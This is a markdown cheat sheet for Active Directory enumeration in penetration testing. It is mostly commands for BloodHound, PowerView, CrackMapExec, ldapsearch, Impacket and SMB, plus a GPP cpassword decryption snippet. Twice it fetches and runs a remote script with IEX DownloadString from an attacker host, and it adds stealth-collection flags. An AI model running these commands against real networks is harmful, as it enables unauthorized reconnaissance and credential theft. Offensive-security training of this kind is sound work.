---
title: "AD Enumeration"
---

# AD Enumeration

Active Directory enumeration is about understanding the environment before attacking it — who the users are, what groups exist, which machines are DCs, what trust relationships exist, and which accounts have elevated privileges. The clearer the picture, the more targeted the attack.

## Initial Connectivity

```bash
# Verify connectivity to DC
nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269 <DC_IP>

# LDAP anonymous check
ldapsearch -H ldap://<DC_IP> -x -s base namingcontexts
ldapsearch -H ldap://<DC_IP> -x -b "" -s base '(objectclass=*)'
```

## BloodHound — Attack Path Mapping

The most powerful AD enumeration tool. Collects relationships between users, computers, groups, and ACLs, then visualizes attack paths.

### Collection with SharpHound

```powershell
# Download collector
IEX (New-Object Net.WebClient).DownloadString('http://KALI/SharpHound.ps1')

# Collect all data
Invoke-BloodHound -CollectionMethod All

# Specific collections
Invoke-BloodHound -CollectionMethod DCOnly          # DC only (faster)
Invoke-BloodHound -CollectionMethod ComputerOnly    # Sessions, local admins
Invoke-BloodHound -CollectionMethod Group,Trusts    # Groups and trusts only

# Stealth collection
Invoke-BloodHound -CollectionMethod All -ExcludeDC -Stealth
```

```shell
# SharpHound.exe
SharpHound.exe -c All
SharpHound.exe -c All --zipfilename bloodhound.zip
SharpHound.exe -c DCOnly -d domain.local
```

### Collection from Kali (Unauthenticated / Valid Creds)

```bash
# bloodhound-python (requires valid credentials)
bloodhound-python -d domain.local -u user -p password -ns <DC_IP> -c All

# With hash
bloodhound-python -d domain.local -u user --hashes :NTLM_HASH -ns <DC_IP> -c All
```

### BloodHound Queries

Key queries to run after importing data:

```
Find All Domain Admins
Find Shortest Paths to Domain Admins
Find Principals with DCSync Rights
Shortest Paths to Unconstrained Delegation Systems
Find Computers with Unsupported Operating Systems
Find AS-REP Roastable Users
Find Kerberoastable Users with High Value Targets
```

## PowerView Enumeration

```powershell
# Import
IEX (New-Object Net.WebClient).DownloadString('http://KALI/PowerView.ps1')
Import-Module .\PowerView.ps1

# Domain info
Get-Domain
Get-DomainController
Get-DomainController -Domain child.domain.local

# Users
Get-DomainUser                          # All users
Get-DomainUser -Identity administrator  # Specific user
Get-DomainUser -SPN                     # Kerberoastable users
Get-DomainUser -PreauthNotRequired      # AS-REP roastable

# Groups
Get-DomainGroup | select name
Get-DomainGroupMember "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Computers
Get-DomainComputer | select name,operatingsystem
Get-DomainComputer -OperatingSystem "*Server 2019*"
Get-DomainController

# Trust relationships
Get-DomainTrust
Get-ForestTrust
Get-DomainTrust -Domain child.domain.local

# Find local admins across domain
Find-LocalAdminAccess -Verbose  # Slow — queries every computer
Get-NetLocalGroupMember -ComputerName <host> -GroupName Administrators

# Find logged-on users
Get-NetLoggedon -ComputerName <host>
Get-DomainController | Get-NetLoggedon  # Sessions on DCs

# ACL hunting
Find-InterestingDomainAcl -ResolveGUIDs | select ObjectDN,ActiveDirectoryRights,SecurityIdentifier
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs

# GPO enumeration
Get-DomainGPO | select displayname,gpcfilesyspath
Get-DomainGPOLocalGroup  # GPOs that configure local groups
```

## Ldapdomaindump

Dumps all AD objects and creates HTML reports:

```bash
ldapdomaindump <DC_IP> -u 'domain\user' -p 'password'
ldapdomaindump <DC_IP> -u 'domain\user' -p 'password' -o ./dump/

# View reports
firefox dump/domain_users.html
firefox dump/domain_computers.html
firefox dump/domain_groups.html
```

## CrackMapExec

```bash
# Domain enumeration
crackmapexec smb <DC_IP> -u user -p password --users
crackmapexec smb <DC_IP> -u user -p password --groups
crackmapexec smb <DC_IP> -u user -p password --computers
crackmapexec smb <DC_IP> -u user -p password --shares

# Password policy (important for spray — avoid lockouts)
crackmapexec smb <DC_IP> -u user -p password --pass-pol

# Logged-on users
crackmapexec smb <IP> -u user -p password --loggedon-users

# Sessions
crackmapexec smb <IP> -u user -p password --sessions

# Domain admins
crackmapexec smb <DC_IP> -u user -p password --groups "Domain Admins"
```

## LDAP Enumeration

```bash
# Enumerate users
ldapsearch -H ldap://<DC_IP> -D "user@domain.local" -w "password" -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName

# All objects
ldapsearch -H ldap://<DC_IP> -D "user@domain.local" -w "password" -b "DC=domain,DC=local" "(objectClass=*)"

# Computers
ldapsearch -H ldap://<DC_IP> -D "user@domain.local" -w "password" -b "DC=domain,DC=local" "(objectClass=computer)" name,operatingSystem

# Groups
ldapsearch -H ldap://<DC_IP> -D "user@domain.local" -w "password" -b "DC=domain,DC=local" "(objectClass=group)" name,member

# SPN accounts (Kerberoastable)
ldapsearch -H ldap://<DC_IP> -D "user@domain.local" -w "password" -b "DC=domain,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName,servicePrincipalName

# AS-REP roastable (DONT_REQ_PREAUTH)
ldapsearch -H ldap://<DC_IP> -D "user@domain.local" -w "password" -b "DC=domain,DC=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
```

## Impacket Tools

```bash
# Get AD users
GetADUsers.py -all domain.local/user:password -dc-ip <DC_IP>

# SPN enumeration
GetUserSPNs.py domain.local/user:password -dc-ip <DC_IP>

# List domain controllers
python3 -c "import socket; print(socket.gethostbyname('_ldap._tcp.dc._msdcs.domain.local'))"

# Enumerate via RPC
rpcclient -U "user%password" <DC_IP>
# Commands inside rpcclient:
enumdomusers
enumdomgroups
queryuser <RID>
getdompwinfo  # Password policy
netshareenumall
```

## SMB Enumeration for AD

```bash
# List shares
smbclient -L //<DC_IP> -U 'domain\user%password'
smbmap -H <DC_IP> -u user -p password -d domain.local

# SYSVOL and NETLOGON — always check these
smbclient //<DC_IP>/SYSVOL -U 'domain\user%password'
smbclient //<DC_IP>/NETLOGON -U 'domain\user%password'

# Search for interesting files in SYSVOL
find /mnt/sysvol -name "*.xml" 2>/dev/null  # GPP passwords (cpassword)
find /mnt/sysvol -name "*.ini" 2>/dev/null
```

### GPP Password Decryption

```bash
# Group Policy Preferences passwords (old issue, but still found in legacy envs)
gpp-decrypt "encrypted_cpassword_value"

# Or decrypt manually (Python)
python3 -c "
import base64
from Crypto.Cipher import AES
key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'
cpassword = 'encrypted_value'
password = base64.b64decode(cpassword + '==')
cipher = AES.new(key, AES.MODE_CBC, iv=b'\\x00' * 16)
print(cipher.decrypt(password).decode().rstrip('\\x00'))
"
```

## Enumeration Checklist

```
[ ] Domain name, FQDN
[ ] Domain Controllers (IP, hostname, OS)
[ ] Domain functional level
[ ] Domain users (list, disabled, locked, last logon)
[ ] Domain admins
[ ] Service accounts (SPNs) — Kerberoast candidates
[ ] Accounts with no preauth — AS-REP roast candidates
[ ] Domain trusts
[ ] Shares accessible with current credentials
[ ] GPO enumeration — misconfigured policies
[ ] SYSVOL contents — cpassword in XML files
[ ] ACL misconfigurations (GenericAll, WriteDacl, etc.)
[ ] Unconstrained / constrained delegation
[ ] AdminSDHolder anomalies
[ ] Computers with outdated OS
```
